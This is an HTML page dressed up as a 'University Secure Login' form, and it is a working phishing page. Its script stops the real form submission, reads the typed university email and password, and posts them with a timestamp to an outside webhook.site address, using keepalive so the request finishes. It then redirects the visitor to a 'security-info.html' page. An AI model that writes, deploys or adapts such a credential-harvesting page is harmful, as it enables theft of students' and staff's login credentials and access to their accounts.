<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>University Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
        .login-container { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; }
        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <h2>University Secure Login</h2>
    <div class="login-container">
        <img src="logo.png" alt="University Logo" width="150">
        <form id="authForm">
            <input type="text" name="user" placeholder="University Email" required><br>
            <input type="password" name="pass" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        document.getElementById("authForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent actual form submission
            
            // Get user input
            let user = document.querySelector('input[name="user"]').value;
            let pass = document.querySelector('input[name="pass"]').value;
            
            // Create payload
            let payload = {
                user: user,
                pass: pass,
                action: "Login Attempt",
                time: new Date().toISOString()
            };

            // Send data to webhook with fetch() and keepalive
            let webhookURL = "https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f";
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
                keepalive: true  // Ensures request completes even if page is redirected
            }).then(() => {
                // Redirect user after ensuring data is sent
                window.location.href = "security-info.html";
            }).catch(error => console.error("Error:", error));
        });
    </script>

</body>
</html>
